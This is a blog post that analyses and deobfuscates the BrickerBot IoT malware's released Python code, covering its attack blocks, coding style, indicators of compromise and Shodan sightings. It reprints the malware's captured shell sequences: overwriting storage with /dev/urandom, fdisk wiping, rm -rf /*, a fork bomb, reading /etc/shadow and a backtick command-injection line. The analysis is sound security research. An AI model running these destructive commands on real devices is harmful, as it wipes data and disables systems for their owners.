---
layout: post
title: "Deobfuscating BrickerBot"
date: 2018-08-10
tags:
- InfoSec
---

This post discusses BrickerBot, a malware that operated from the end of 2016 to the end of 2017. The claimed author uploaded obfuscated code in December of 2017. There have been discussions about this project, but there does not appear to have been any work on deobfuscating and analyzing the code itself. 

<!--end excerpt-->

## Background

BrickerBot was malware that operated, according to its claimed author, between November of 2016 and December of 2017. The author goes by The Doctor, Dr Cyborkian, or The Janit0r (the author's Hacker Forums name), and named the project "Internet Chemotherapy." Janit0r claimed in a message on 10 December 2017 that they would be retiring BrickerBot and simultaneously made part of the source code for BrickerBot available. The code appears to contain payloads and operational code to run the malware. Janit0r stated in one message that there is also an SSH crawler, which janit0r states is "too dangerous to publish," containing "various levels of automation for the purpose of moving laterally through poorly designed ISP networks or taking them over through only a single breached router."

The goal of the Internet Chemotherapy project was twofold: a greyhat attempt to prevent the spread of other malware (e.g., Mirai, Imeij, Amnesia, etc.) by reconfiguring or bricking/disabling vulnerable devices, and -- with the publications -- pressure IoT and other device manufacturers to better secure their devices. Claiming that they've bricked/disabled over 10 million devices, janit0r warns with their parting words that IoT are catastrophically insecure. Janit0r points out that they have "never actually worked in networking, systems administration, information security or anything of the sort, but [has] a hobby interest in all of the above." Ironically, janit0r has suggested that BrickerBot's success in reducing DDoS bot networks may have made manufacturers complacent about the state of their security, reducing pressure to strengthen it. Janit0r predicts that "the internet is only one or two serious IoT exploits away from being severely disrupted."

Janit0r suggests the reader take proactive actions, such as:

* Review your own ISP's security.
* Buy only provably secure products.
* Lobby politicians and government officials to legislate for improved IoT security.
* Volunteer time or capital to whitehat organizations.
* Legal action by stakeholders.

Below are archives of some of janit0r's postings:

* 2017 10 08: [The recent wave of DVR attacks](https://archive.fo/jRliM).
* 2017 12 10: [Internet Chemotherapy](https://ghostbin.com/paste/cjq86).
* 2017 12 23: [Internet Chemotherapy Part 2: Lessons from the Rogers Hi-Speed Internet Incident](https://ghostbin.com/paste/q86bo).
* 2018 01 02: [Internet Chemotherapy Part 3: The baffling case of Optify/Keycom's mismanagement](https://ghostbin.com/paste/mmf2k).

Below is some coverage:

* 2017 04 05: Radware's discovery of [BrickerBot](https://security.radware.com/ddos-threats-attacks/brickerbot-pdos-permanent-denial-of-service/) as a permanent denial of service attack via its honeypots.
* 2017 04 21: Radware's discovery of new versions of [BrickerBot](https://security.radware.com/ddos-threats-attacks/brickerbot-pdos-back-with-vengeance/).
* 2017 04 21: Bleeping Computer's [article](https://www.bleepingcomputer.com/news/security/brickerbot-author-claims-he-bricked-two-million-devices/), with some email correspondence with janit0r. The article includes a claim that 2 million devices have been affected.
* 2017 12 11: Bleeping Computer's [article](https://www.bleepingcomputer.com/news/security/brickerbot-author-retires-claiming-to-have-bricked-over-10-million-iot-devices/) covering the retirement of the project. The article claims that the number of affected devices had reached 10 million.
* 2017 12 19: Trustwave's [analysis](https://www.trustwave.com/Resources/SpiderLabs-Blog/BrickerBot-mod_plaintext-Analysis/) of BrickerBot's obfuscated code.
* 2018 01 01: jay-johnson's [nerfball](https://github.com/jay-johnson/nerfball), which creates a Python jail to test malware, has some of his analysis of BrickerBot.

Jay-johnson's nerfball downloads the obfuscated code from JeremyNGalloway's [github repo](https://github.com/JeremyNGalloway/mod_plaintext.py) and appears to execute it. He has some notes on Internet Chemotherapy based on executing it within his jail program. The obfuscated code cannot run as some functions (such as those named printstatus(), and especially unknown_func() and unknownfunction() in my unobfuscated version) are undeclared. The code needs to be edited. I would be interested to know what modifications or perhaps improvements he made to get it to working order, but he doesn't seem to have shared that in the repo.

Below are some discussions about BrickerBot.

* 2017 04 25: [Article](https://gizmodo.com/this-hacker-is-my-new-hero-1794630960) on Gizmodo.
* 2018 01 00: [Discussion](https://news.ycombinator.com/item?id=15946095) on Hacker News.
* 2018 01 00: [Discussion](https://www.reddit.com/r/netsec/comments/7jzwpf/internet_chemotherapy/) on /r/netsec.

Reactions center around a few issues:

1. Moral and security justifications for janit0r's greyhat approach. Internet Chemotherapy was ostensibly designed to counter malicious malware such as Mirai, which are used to set up large bot nets used in DDoS attacks, etc. Is it justified that Internet Chemotherapy gains unauthorized access, then reconfigures or bricks/disables devices so that they can't be attacked by the blackhat malware?
2. There seems to be consensus that some IoT and other internet device manufacturers have failed to provide adequate, or even basic, security on their devices. It also seems to be the consensus that this technical failure poses considerable threat to the security of their customers and the internet as a whole. 
3. There is some argument over the quality or effectiveness of the payloads, such as whether some are 0-days or previously known vulnerabilities, or even if this code is functional at all. There is some discussion sprinkled within the links above, sometimes via Twitter or responses from janit0r.
4. Some have also criticized what they characterize as janit0r's grandiosity, even calling it a "God Complex" or "Delusions of Grandeur."

The primary goal of this post was to exercise deobfuscation, which does not seem to have been done or publicly shared by others. The analyses I can find focus on the cleartext payloads. Since those already exist (including janit0r's own writing) and are readily accessible, I have not focused on that here.

Having debofuscated the code and reviewed it a few times, I've made some notes about the coding style and interesting functionality I've found.

## Disclaimer

This code was deobfuscated directly from the code purportedly released by janit0r in obfuscated form. The code is not the complete malware. It also calls some functions and variables that are not declared in the code. I've also removed a significant portion of the payloads, including only enough to indicate coding style and flavor of payloads. In brief, the code here is functionally the same as the obfuscated code released by janit0r, then significantly weakened. I've also modified some payloads to, presumably, be nonfunctional.

Standard warning applies that this code is not meant to nor written up to be used as malware, but for analysis.

The obfuscated code is available [here](https://ghostbin.com/paste/o6553).

## Deobfuscation

The code was manually deobfuscated by static analysis. In addition to the notes here, the deobfuscated code contains comments for both functions and variables. Functions and variables were renamed to be descriptive, rather than their obfuscated, random names.

The deofuscated code is available [here](https://github.com/nyoshimizu/Deobfuscated-BrickerBot/blob/master/deobfuscated_brickerbot.py).

The code may have been run through an obfuscation program. There seem to be a number available, although I don't have direct experience with any of them. In particular, the code contains a significant number of nonreachable code by "if false" statements, such as:

```python
if 20 - 20: iIiIiiOi()
```

which were removed in great numbers.

Then [PEP8](https://www.python.org/dev/peps/pep-0008/) was applied to make the code more readable, although with some liberties. For example, some longer lines were left because they contained long payloads or deeply nested loops which sometimes made line-shortening difficult.

Note some functions call core Python functions, such as those for printing, sockets, or regular expression searches, and greatly helped identify code as they cannot be obfuscated. 

## General

### Obfuscated code is version 3 of BrickerBot.

Radware used honeypots to track BrickerBot. They identified four versions of BrickerBot which they called BrickerBot.1 through .4. They used incoming command sequences to identify the different versions, of which short snippets were released as part of the article. They also looked at the timing and waves of BrickerBot attacks propagating throughout networks.

Radware matches the following commands to versions of BrickerBot:

BrickerBot.1
```bash
fdisk -l
busybox cat /dev/urandom >/dev/mtdblock0 &
busybox cat /dev/urandom >/dev/sda &
busybox cat /dev/urandom >/dev/mtdblock10 &
busybox cat /dev/urandom >/dev/mmc0 &
busybox cat /dev/urandom >/dev/sdb &
busybox cat /dev/urandom >/dev/ram0 &
fdisk -C 1 -H 1 -S 1 /dev/mtd0
w
fdisk -C 1 -H 1 -S 1 /dev/mtd1
w
fdisk -C 1 -H 1 -S 1 /dev/sda
w
fdisk -C 1 -H 1 -S 1 /dev/mtdblock0
w
route del default;iproute del default;ip route del default;rm -rf /* 2>/dev/null &
sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1
halt -n -f
reboot
```

BrickerBot.2
```bash
w
uname -a
ls -alF /etc/
cat /etc/passwd
cat /etc/shadow
cat /proc/version
su root
uptime
cat /etc/motd
ls -al /sbin/

fdisk -l
df
cat /proc/mounts

dd if=/dev/urandom of=/dev/sda &
dd if=/dev/urandom of=/dev/sda1 &
dd if=/dev/urandom of=/dev/sda2 &
dd if=/dev/urandom of=/dev/sda3 &
dd if=/dev/urandom of=/dev/sda4 &
dd if=/dev/urandom of=/dev/sdb &
dd if=/dev/urandom of=/dev/mtd0 &
dd if=/dev/urandom of=/dev/mtd1 &
dd if=/dev/urandom of=/dev/mtd2 &
dd if=/dev/urandom of=/dev/mtd3 &
dd if=/dev/urandom of=/dev/mtdblock0 &
dd if=/dev/urandom of=/dev/mtdblock1 &
dd if=/dev/urandom of=/dev/mtdblock2 &
dd if=/dev/urandom of=/dev/mtdblock3 &
dd if=/dev/urandom of=/dev/mtdblock4 &
dd if=/dev/urandom of=/dev/mtdblock5 &
dd if=/dev/urandom of=/dev/mtdblock6 &
dd if=/dev/urandom of=/dev/mtdblock7 &
dd if=/dev/urandom of=/dev/hda1 &
dd if=/dev/urandom of=/dev/hdb1 &
dd if=/dev/urandom of=/dev/root &
dd if=/dev/urandom of=/dev/ram0 &
dd if=/dev/urandom of=/dev/mmcblk0 &
dd if=/dev/urandom of=/dev/mmcblk0p1 &

cat /dev/urandom >/dev/sda &
cat /dev/urandom >/dev/sda1 &
cat /dev/urandom >/dev/sda2 &
cat /dev/urandom >/dev/sda3 &
cat /dev/urandom >/dev/sda4 &
cat /dev/urandom >/dev/sdb &
cat /dev/urandom >/dev/mtd0 &
cat /dev/urandom >/dev/mtd1 &
cat /dev/urandom >/dev/mtd2 &
cat /dev/urandom >/dev/mtd3 &
cat /dev/urandom >/dev/mtdblock0 &
cat /dev/urandom >/dev/mtdblock1 &
cat /dev/urandom >/dev/mtdblock2 &
cat /dev/urandom >/dev/mtdblock3 &
cat /dev/urandom >/dev/mtdblock4 &
cat /dev/urandom >/dev/mtdblock5 &
cat /dev/urandom >/dev/mtdblock6 &
cat /dev/urandom >/dev/mtdblock7 &
cat /dev/urandom >/dev/hda1 &
cat /dev/urandom >/dev/hdb1 &
cat /dev/urandom >/dev/root &
cat /dev/urandom >/dev/ram0 &
cat /dev/urandom >/dev/mmcblk0 &
cat /dev/urandom >/dev/mmcblk0p1 &

route del default;iproute del default;rm -rf /* 2>/dev/null &
iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP
d(){ d|d & };d 2>/dev/null
sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1
halt -n -f
reboot
d(){ d|d & };d
```
BrickerBot.3
```bash
busybox cat /dev/urandom >/dev/mtdblock0 &
busybox cat /dev/urandom >/dev/sda &
busybox cat /dev/urandom >/dev/mtdblock10 &
busybox cat /dev/urandom >/dev/mmc0 &
busybox cat /dev/urandom >/dev/sdb &
busybox cat /dev/urandom >/dev/ram0 &
busybox cat /dev/urandom >/dev/mtd0 &
busybox cat /dev/urandom >/dev/mtd1 &
busybox cat /dev/urandom >/dev/mtdblock1 &
busybox cat /dev/urandom >/dev/mtdblock2 &
busybox cat /dev/urandom >/dev/mtdblock3 &
fdisk -C 1 -H 1 -S 1 /dev/mtd0
w
fdisk -C 1 -H 1 -S 1 /dev/mtd1
w
fdisk -C 1 -H 1 -S 1 /dev/sda
w
fdisk -C 1 -H 1 -S 1 /dev/mtdblock0
w
route del default;iproute del default;ip route del default;rm -rf /* 2>/dev/null &
sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1
halt -n -f
reboot
```

BrickerBot.4
```bash
fdisk -l
busybox cat /dev/urandom >/dev/mtdblock0 &
busybox cat /dev/urandom >/dev/sda &
busybox cat /dev/urandom >/dev/mtdblock10 &
busybox cat /dev/urandom >/dev/mmc0 &
busybox cat /dev/urandom >/dev/sdb &
busybox cat /dev/urandom >/dev/ram0 &
fdisk -C 1 -H 1 -S 1 /dev/mtd0
w
fdisk -C 1 -H 1 -S 1 /dev/mtd1
w
fdisk -C 1 -H 1 -S 1 /dev/sda
w
fdisk -C 1 -H 1 -S 1 /dev/mtdblock0
w
route del default;iproute del default;ip route del default;rm -rf /* 2>/dev/null &
sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1
halt -n -f
reboot
```

The obfuscated code appears to match BrickerBot.3, matching the payload for Dahua devices (default credentials root/vizxv, mentioned in an article) and HiLinux OS's. Compared to BrickerBot.1, it shows slightly updated payloads. Compared to BrickerBot.2, it again shows slightly updated brick commands for a general Linux target. BrickerBot.4 shows identical payloads to BrickerBot.1 in the article: based on Radware's versioning, the payload in BrickerBot.4 appears to have been scaled back after version 3.

The difference in BrickerBot.4 command sequences versus BrickerBot.3 shows the .4 version removed `cat /dev/urandom >/dev/...` commands used to brick the target device, returning to the set of commands seen in BrickerBot.1. There's no obvious reason why a later version would remove such commands as they shouldn't cause traps for the code to hang on. Having more of those lines would seem to only increase the probability that enough chaos was pushed to the target device in order to brick it, whereas it might otherwise slow down a bit. Or janit0r the payload may have been reduced to match the device files exactly on the target device. It is possible the BrickerBot.4 wave that was caught by Radware's honeypots was simply a repeat of BrickerBot.1. They may also have caught other payloads that suggested that it was a new version of BrickerBot. In any case, it's not possible to make such an assessment with the small amount of information available here.

### Obfuscated code is written for Python 2.

The code is written to be used by Python 2. There is a single print statement which must be run in Python 2:

```python
print "Debug: Skipping sock close due to keepalive"
```

In contrast, print statements in Python 3 are made by, e.g.,

```python
print("Hello world.")
```

### Obfuscated code is launched as a script.

The code is written to be executed like a script. It would be executed by being called from the command line, i.e.,

```bash
python mod_plaintext.py
```

rather than be imported as a module by other Python code. So, it would perhaps have been called as part of a Bash script that performed other duties such as SSH into new target hosts, call into a C&C server, etc. (although a single Python script could have performed those functions, too). Or perhaps its call could have been inserted into a login script so that it would be persistent.

This can be seen where there is executable, un-indented Python code rather than, e.g., classes to be imported as a module by other Python code. Instead, the script defines variables (e.g., payloads, lists, and dictionaries to track target identification and attacks) and functions, but the core function occurs at the end of script. Located there is a `while True:` loop. Here, functions are called to make connections to potential target hosts and attack them, as well as listen for incoming, potential targets in an infinite loop until a 17 hour timeout occurs.

### Obfuscated code suggests tool was built up over time.

The code suggests that functionality was added over time, resulting in five main blocks. Four are offensive and one is a listener. Each offensive section of code generally contains payloads to penetrate target hosts, commands to reconfigure or brick target hosts, and functions used to connect, send payloads, and manage attacks. Targets are managed by tracking their corresponding socket objects, attack vectors, timing, and steps in an attack sequence. Socket objects are used to keep track of target hosts, and used as keys for nearly all dictionaries which track the malware's activities. For example, the attack sequences are tracked in dictionaries named target_steps and targeted2_step. Timing is tracked to set delays and timeouts for various actions such as connecting to targets, sending payloads, sending bricking commands, etc. All internet communication is handled using Python's socket, a low-level network interface. It works only in cleartext: i.e., no SSL, TSL, or SSH communication, handling of keys, etc. is performed in the code. The main, infinite loop locate near the end of the code runs these various blocks.

The first block uses default credentials to gain access. It will also set hostnames, messages of the day, etc. to "HACKED," etc., to announce that the device was vulnerable and needed to be secured. This block comprises some 60-70% of the code by number of lines. 

The second block, which is not offensive code, contains a Telnet hosting service on ports 23 and 2323. It will briefly accept connections and track information on those hosts.

The third block sends a `GET .//////////////////`, etc., request to target hosts, and nothing else (possibly to try to cause a buffer overflow / segmentation fault crash to brick the target host).

The fourth block sends payloads via HTTP with GET and POST requests. It contains payloads associated with device names and tries a variety of default credentials and session tokens. It tries randomly generated passwords as eight random of lower and upper case letters, and numbers, where each number is three times more likely than a letter. The GET and POST request payloads may also contain other randomly generated strings, referred to as "%%RAND8%%," "%%RHEX1%%", etc. in the code. This block especially seems to perform more brute force then the others, trying multiple credentials and payloads on the same targets. As before, this block will set a variety of device strings (especially SSIDs) to "HACKED," etc., to be broadcast.

The fifth block attacks targets via SOAP messages, specifically targeting devices of TR-069 and Huawei variety.

Therefore, there are four blocks of offensive code plus one block which handles incoming connections.

The main code that manages these blocks is the infinite loop near the end of the code, as well as the readsentinel() function at the beginning which reads a configuration file. The Sentinel is some program, whose code is not visible here, which has scanned for targets in its network and written files which determine the malware's configuration and target host information. The target host information is loaded to generate the first sets of target hosts to attack. It also contains configuration options for verbosity.

The code structure seems to suggest that these blocks were added over time (which I suppose is neither surprising nor uncommon, and hinted by janit0r's historical recall of adding new payloads and capabilities as blackhat bots evolved). The beginning of the code contains functions to read the Sentinel configuration files. Then the various blocks of offensive code follow, followed by a final main loop that continuosly runs them. The blocks must be placed before the main loop so they can be called, and were presumbly added sequentially as janit0r wanted to add more capabilities.

Thus, main loop starts with:

```python
while True:
    unknownfunction()
    
    timenow = time.time()
    
    resettime_nextconnect()  # From first block.
    killtargets()

    HTTP_connecttargets()  # From fourth block.
    requests_sockconnect()
    HTTP_targets_send()
    
    requests_attack()  # From fifth block.

    connectwebtargets()  # From third block.
    webtargets_sendrequests()
    
    hosttelnet()  # From second block.
```

which calls the five blocks separately (rather than as a call to a single function).

In addition, note that the four offensive blocks of code have the same structure in that they contain variables to track similar information (such as target host information, payloads to try, times, etc.) and similar functions (such as connecting to targets, editing the lists or dictionaries of information). The code for HTTP attacks seem to be different in that while the request payloads are available as lists, the credentials are coded via if statements related to target OEM names and number of login tries. So despite structural similarities in the blocks, they were written as separate, independent blocks of code.

So it would appear that the general structure of the offensive code was set early in development, but that these additional blocks were added, with the same structure in mind, as janit0r upgraded and evolved the project. Although a more general structure could have been developed (i.e., a single payload dictionary that was used by all vectors of attacks, a single list of target hosts, etc.), one could imagine that janit0r was under pressure to edit rather than completely rewrite existing code in order to save time and keep up-to-speed with evolving capabilities.

## Specific functionality

This section points out specific functionalities throughout the code.

### Block 1

Block 1 uses a large list of default credentials to try to penetrate targets. It also creates a randomly generated password for user "root" comprised of an OEM-like name, then a random number 100-999, a random number 10-99, a random symbol or capital letter, and a technical word. These have a very low occurrence versus the enumerated default credentials. After penetration, commands sent to brick the target device include the following:

* concatonating /dev/urandom or /dev/zero to a variety of storage devices
* erasing storage devices
* clearing routing tables and dropping all traffic via firewall
* downing network interfaces
* killing all processes or suspending tasks
* turning off services
* setting off a fork bomb
* resetting passwords
* setting the target's IP to a forbidden/unreachable address
* removing TCP time stamps
* setting the kernel to run with a single thread.

One odd command is:

```bash
date 2030 12 31 23 59 59
```

I can't find a reason for setting the date to the second before the year 2031: it only recalled for me the epoch time (year 2038) bug. 

It may also change the hostname, message of the day, wall a message, etc. to "HACKED," "UPGRADE," "SYSTEM HACKED PLEASE REINSTALL," "DEVICE HACKED - ACCOUNT %OLDUSER% HAD UNSAFE PASSWORD" (%OLDUSER% to be replaced), etc. This is janit0r's effort to get the device noticed and secured.

The malware's interaction with the target host is guided by banner responses (i.e., based on the target's device or OS) and command line prompts (to determine when to enter username and passwords, brick commands, etc.)

This block also sends commands for some intelligence gathering on a target (newlines removed):

```bash
w
uname -a
ls -alF /etc/
cat /etc/passwd
cat/etc/shadow
cat /proc/version
```

The code doesn't show the response being saved, although perhaps some other code included traffic sniffers to log that information. Janit0r's writings include traffic data or target information, and in part 2 janit0r mentions having collected "over 95 gigabytes worth of device transaction logs and ISP configurations" over two years. This logging is not apparent in the code here.

Some of the payloads also contain commands to reset the device's username and password. In those cases, the username is set to "skitle" and the password is set to eight random of lower and upper case letters, and numbers, where each number is three times more likely than a letter.

Some of the payloads also include references to IP addresses, either as local host-like IPs to which traffic can be sinked (127.0.0.1, 127.0.0.2) and private IPs (10.1.2.3 and .4, 192.168.99.1, 192.0.0.64). Presumably these addresses are used to cause traps and timeouts.

The code also references IP addresses 1.2.3.4 to .6. Like the others, they are used to point to DNS servers, route traffic to, assign IP addresses, etc. Perhaps these are also meant to just sink traffic. However, there is one command containing:

```
restore http://1.2.3.4/&&reboot
```

The malware is trying to receive a file system backup image from 1.2.3.4.

Historically, 1.2.3.0/24 was allocated for private use but in January of 2010 was [allocated to APNIC](http://packetlife.net/blog/2010/feb/5/ripe-plays-with-1-0-0-0-network-apnic-allocation/), the Internet registry for the Asia-Pacific region. Since then, APNIC has been de-bogonizing the 1.0.0.0/8 network: that is, reducing the existing traffic destined for what should have been private and illegal addresses. In the December 2017 post, janit0r notes they focused on APNIC for part of the project.

This particular command stands out because it is actively seeking out 1.2.3.4 and expecting to interact with it (i.e., get a backup image to copy). It seems to be the only command to restore a device from a remote source, whereas most commands simply restore factory settings. For janit0r's part, this particular command (for an OEM name of "genu") may have been copied from another source, though I can't find any. But the question remains.

Perhaps the malware tries to distribute some system image for this device among nearby networks, trying to avoid being dropped. Other commands set device IPs to these private addresses and could have made connections. I'm not sure if a C&C server could have been set up with that address though, as presumably routers would refuse to send traffic there or at least beyond the local, private network. Or it may have been a mistake or placeholder IP address that remains although presumably it would have been pre-2010, almost a decade ago. Or it could be a way to inject the `reboot` command by passing it in with `restore` to an unreachable address. The commands prior to restore are `backup` and `revertfac`, at which point a reboot was in order. However, the other command listed for this family of devices (genu01 through genu09) show "reboot" being called on its own.

(For an example of code injection among the kill commands:
```bash
ping `cat /dev/urandom >/dev/mtdblock0;cat /dev/urandom >/dev/mtdblock1; cat /dev/urandom >/dev/mtdblock2 &`
```
)

In any case, 1.2.3.0/24 is currently listed as belonging to APNIC and still being used for their debogonizing project.

```bash
Quick Stats
IP Location 	Australia Australia Brisbane Apnic Pty Ltd
Whois Server 	whois.apnic.net
IP Address 	1.2.3.4
Reverse IP 	1,766 websites use this address.
inetnum:        1.2.3.0 - 1.2.3.255
netname:        Debogon-prefix
descr:          APNIC Debogon Project
descr:          APNIC Pty Ltd
country:        AU
admin-c:        AR302-AP
tech-c:         AR302-AP
mnt-by:         APNIC-HM
mnt-routes:     MAINT-AU-APNIC-GM85-AP
mnt-irt:        IRT-APNICRANDNET-AU
status:         ASSIGNED PORTABLE
last-modified:  2011-09-22T03:42:30Z
source:         APNIC

irt:            IRT-APNICRANDNET-AU
address:        PO Box 3646
address:        South Brisbane, QLD 4101
address:        Australia
e-mail:         
abuse-mailbox:  
admin-c:        AR302-AP
tech-c:         AR302-AP
auth:           # Filtered
mnt-by:         MAINT-AU-APNIC-GM85-AP
last-modified:  2011-09-22T03:53:02Z
source:         APNIC

role:           APNIC RESEARCH
address:        PO Box 3646
address:        South Brisbane, QLD 4101
address:        Australia
country:        AU
phone:          +61-7-3858-3188
fax-no:         +61-7-3858-3199
e-mail:         
nic-hdl:        AR302-AP
tech-c:         AH256-AP
admin-c:        AH256-AP
mnt-by:         MAINT-APNIC-AP
last-modified:  2018-04-04T04:26:04Z
source:         APNIC
```

From where I am, 1.2.3.4 is unreachable by ping:

```bash
****@****:~$ ping -c 3 -W 10 1.2.3.4
PING 1.2.3.4 (1.2.3.4) 56(84) bytes of data.

--- 1.2.3.4 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 2038ms
```

However, a connection can be made to it. It doesn't respond with HTTP:

```bash
***@***:~$ curl -I 1.2.3.4
curl: (52) Empty reply from server
```

But it seems to be connectable, and silently closes the connection after a bit:

```bash
****@****:~$ nc -nv 1.2.3.4 80
Connection to 1.2.3.4 80 port [tcp/*] succeeded!
helo
helo
****@****:~$ 
```

This block also contained functions to defeat CAPTCHA. This is contained in the `solvecaptcha()` and `captchanum()` functions. These are called if a target host's response contains "Please input the verification code:" as seen in the `killtargets()` function. They expect to see a numerical CAPTCHA image in the banner.

These functions expect a CAPTCHA image where pixels can be any character, and empty spaces can be either spaces or tabs. `solvecaptcha()` parses the banner to separate out each number, then passes each to `captchanum()` which determines the number represented. `captchanum()` scans the top, middle, and bottom of the image to look for characteristic shapes of each number. It expects fairly ortholinear shapes. Further details are contained in the comments of these functions.

I have not been able to find a service that provides such a CAPTCHA service.

### Block 2

Block 2 handles incoming connections to port 23 or 2323 of the malware's host. It receives incoming connections, serves a randomly selected banner, prompts for a password, then, replying that the password is incorrect, drops the connection. The set of banners it sends can be found in the list `routerbanners[]`, containing banners for DSL-500B, BCM96328, V100-IGM/MPX, Huawei, etc. It will drop any future incoming connections from the same host and port. It will also add the host to the lists of targets to attack later. 

### Block 3

As mentioned above, block 3 simply sends a long (> 500 character) GET request to targets, presumably to try to cause a buffer overflow and crash the target host.

### Blocks 4 and 5.

As mentioned above, blocks 4 and 5 generally follow the modus operandi of block 1, sending default credentials and payloads to targets. Block 4 does this via GET and POST requests, and block 5 does so via SOAP commands.

## Coding style

Here, I note some coding style which is not familiar to me or may be considered un-"Pythonic." The goal here was not to be critical, but to be cognizant of and build familiarity with the code beyond simply its functional aspects.

### Not in

The code contains an unstandard use of finding substrings within strings or elements within lists. This code uses this format:

```python
if not 'test' in 'teststring':
    [...]

if not thing in listofthings:
    [...]
```

whereas standard practice ("Pythonic") is:

```python
if 'test' not in 'teststring':
    [...]
    
if thing not in listofthings:
    [...]
```

Specific examples in the code are:

```python
if not port in read:
    [...]

if not listenport in config_listenports:
    [...]
```

PEP8's preference for the latter is [here](https://www.python.org/dev/peps/pep-0008/#programming-recommendations), and dates back at least to 2013 when PEP 8 was last edited.

### Throwaways in tuples

The code uses [select.select()](https://docs.python.org/2/library/select.html#select.select) which is an interface to the Unix select() system call. It is used to return a tuple containing lists of sockets which are ready for reading or writing to so that banners can be read and payloads can be sent. Three lists are expected back, corresponding to sockets that are ready for reading, writing, and an "exceptional condition." The code just needs the lists for read and write, so the third list is unnecessary.

The code handles that last, unnecessary list by passing it on into a list that is never used:

```python
sockreadyr, sockreadyw, noneready = select.select(targeted_sock,
                                                  targeted_sock,
						  [],
						  timeout
						  )
```

However, in Python it is conventional to use the underscore to denote a throwaway variable when unpacking tuples:

```python
sockreadyr, sockreadyw, _ = select.select(targeted_sock,
                                          targeted_sock,
                                          [],
                                          timeout
                                          )
```

### Hashed keys

The code relies on many dictionaries to manage its attacks. There are dictionaries that keep track of target hosts, credentials to be used, timing of attacks, etc. in its values. For most of these dictionaries, the code uses socket objects as keys. So each dictionary entry contains a key tied to a single socket connection, for which these various information are stored.

For example, `targeted_targets{}` is a dictionary contains a list of previous targets. The values contain target information such as IP, port number, and the banner. The keys are a hash of the socket connection objects:

```python
target_sockhash = hash(s)
targeted_targets[target_sockhash] = (targetip, int(targetport), bannerhint)
```

However, Python's [dictionaries](https://wiki.python.org/moin/DictionaryKeys) inherently use hashed keys. The key objects are hashed in order to create the lookup values. In fact, Python's [documentation](https://docs.python.org/2/library/functions.html#hash) for `hash()` notes that it returns values that are "integers. They are used to quickly compare dictionary keys during a dictionary lookup."

So it's not clear why the code uses the hashes of socket objects, rather than the sockets themselves, as dictionary keys. As some other code suggests, it might be the code's style to reflect some lower level language. The hash may have been written to use the benefits that are already implemented in Python, and thus the hash step was added.

### Copies of lists

In Python, lists are passed by reference. So when a list `b` is copied from list `a` by `b=a`, `b` points to the same object of data as `a`. If you were to change `b`, it would simultaneously change `a` because they both reference the same object. To create a second copy of list `a` requires using, e.g., `copy.copy()` or `b=a[:]`. See [here](https://stackoverflow.com/questions/4794244/how-can-i-create-a-copy-of-an-object-in-python) for more.

So if you don't create an actual copy of the list, all you've done is create an alias that points to the same name. There is one example of this in the code where this occurs:

```python
hashes = HTTP_hashes
for ahash in hashes:
    jobhash = hash(ahash)
    [...]
```

Note that `ahash` points to the same data as `HTTP_hashes` as it wasn't created as a separate copy. The code would have had the same functionality were it written as `for ahash in HTTP_hashes:`. Perhaps the copy of `HTTP_hashes` may have been to protect the globally accessible `HTTP_hashes` itself. The rest of the for loop connects to targets or resets their timing, using the hashes as keys to several dictionaries. Using the local copy `hashes` would have prevented the existing or potential code from editing `HTTP_hashes`.

### Enumeration of lists

There are several loops where an index number is used. Though it would have been more straightforward to enumerate the list and access the index number directly, the code instead tends to create an index variable then increment it as the loop continues.

For example, `convert_chars()` contains this loop:

```python
idx =0

while idx < len(f):
    fchar = f[idx]
    [...]
    idx += 1
```

and `solvecaptcha()` contains this loop:

```python
idx_y = 0

for line in captchalines:
    captcha_pos[idx_y] = {}
    idx_x = 0

    for characters in line:
        [...]
	idx_x += 1

    [...]
```

In contrast, Python's `enumerate()` could have simplified the code. The first example could have been written as:

```python
for idx, fchar in enumerate(f):
    [...]
```

The non-enumerated code seems to reflect a coding style more aligned to a language like C. The list index and values are handled separately, whereas `enumerate()` allows Python to access both more simply.

### Chained comparisons

The code in `HTTP_sendrequests()` contains:

```python
if HTTP_tries[jobhash] > 0 and HTTP_tries[jobhash] <=5:
    [...]
```

These two comparisons could be [chained](https://docs.python.org/2/reference/expressions.html#comparisons) to be:

```python
if 0 < HTTP_tries[jobhash] <= 5:
    [...]
```

As the Python documentation states, "unlike C, expressions like `a < b < c` have the interpretation that is conventional in mathematics." Similar to the points above, this may reflect a coding style more similar to a language like C, rather than a higher level language like Python.

## Indicators of compromise

Indicators of compromise are available as the Sentinel program writes configuration files to the host. Note that some IOCs may be temporary.

Two files are used by this code for configuration information:

* /tmp/system/update/sentinel.reload (indicates to this code to reload configuration files, but is immediately deleted after reading).
* /tmp/system/control.cfg (contains options).

And a number of files are written in /tmp/system/update/ whose names are used for target information:

* /tmp/system/update/sentinel.jobreq.SCN.[REF].[IP]
* /tmp/system/update/sentinel.jobreq.SCN.[REF].[IPRANGE]
* /tmp/system/update/sentinel.jobreq.SCP.[REF].[PORT]_[IP]
* /tmp/system/update/sentinel.jobreq.SCP.[REF].[PORT]_[IPRANGE],

where `REF` is some reference name to a scan, `IP` is an IP address, `IPRANGE` is a range of addresses such as 192.168.1.10-100, and `PORT` is a number that refers to a set of port numbers (see `loadconfigs()`).

## Internet scan

Is it possible to see this malware still active in the wild? Perhaps someone has repurposed it, or janit0r decided to un-retire and restart it, or the malware is still making its way across vulnerable systems. The Trustwave analysis above searched for "hacker-router-help" and found 30,467 results (and 2,715 results for "html:Chemotherapy," though it's not clear if those actually refer to this project). 

The malware leaves externally visible messages, such as in the hostname, that a device is unsecure. Such messages include "SYSTEM HACKED PLEASE REINSTALL," "DEVICE HACKED - ACCOUNT *** HAD UNSAFE PASSWORD," etc. Shodan may give us a glimpse to see what is out there.

A broad search for "HACKED" returned 25,508 results on 15 August 2018. The results show the word "HACKED" in the hostname, such as:

* HOST-ROUTER-HELP-SOS-HAD-DEFAULT-PASSWORD
* HOST-ROUTER-HELP-SOS-HAD-DUPE-PASSWORD
* HOST-ROUTER-HELP-SOS-VULN-EDB-39701

A search for "HACKED" from 15 August 2018:
<img src="https://raw.githubusercontent.com/nyoshimizu/Deobfuscated-BrickerBot/master/Shodan%20screenshots/hacked.PNG" width="640px" />

